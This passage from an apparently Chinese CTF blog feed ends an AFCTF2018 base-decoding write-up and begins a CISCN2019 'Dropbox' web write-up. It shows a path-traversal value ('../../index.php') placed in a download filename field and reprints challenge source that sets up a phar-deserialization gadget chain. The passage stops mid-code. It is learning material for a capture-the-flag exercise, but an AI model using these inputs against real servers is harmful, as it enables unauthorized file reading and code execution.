punctuation">.</span>b32decode<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            base <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                base <span class="token operator">=</span> base64<span class="token punctuation">.</span>b16decode<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解码完毕qwq！"</span><span class="token punctuation">)</span>                file2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base<span class="token punctuation">)</span>                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><a href="https://shawroot.hatenablog.com/entry/2019/12/30/AFCTF2018/BUUCTF-BASE">看大佬的博客</a></p><h2 id="capture-the-flag"><a href="#capture-the-flag" class="headerlink" title="capture the flag"></a>capture the flag</h2><p><img src="/2020/10/09/AFCTF2018-BASE/QQ截图20201009224151.png" alt><br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">afctf&#123;U_5h0u1d_Us3_T00l5&#125;flag&#123;U_5h0u1d_Us3_T00l5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>大佬们的python语言用得出神入化，我丢，好好看好好学。。。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019-华北赛区-Day1-Web1-Dropbox</title>
      <link href="2020/10/07/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"/>
      <url>2020/10/07/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-任意文件下载"><a href="#0x01-任意文件下载" class="headerlink" title="0x01 任意文件下载"></a>0x01 任意文件下载</h2><p>注册登录后，有个上传文件的地方，上传过图片后可以删除或者下载，然后就想着可能是文件上传漏洞，开始我还以为要上传图片马，后来实在不行了。</p><p>看了看wp老长的phar反序列化，还要构造类似pop链的东西，爱了。<br>这里的这个任意文件下载-&gt;先用burp抓包，修改其中的filename字段就可以了，改为../../index.php下载主页代码。其他代码类似也能下载，这信息收集真的难顶，收集能收集20分钟，我丢。</p><p>利用的类都在class.php文件里面，下面是class文件的内容<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">' B'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' KB'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' MB'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' GB'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>其中利用的重中之重是下面的部分代码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//2</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 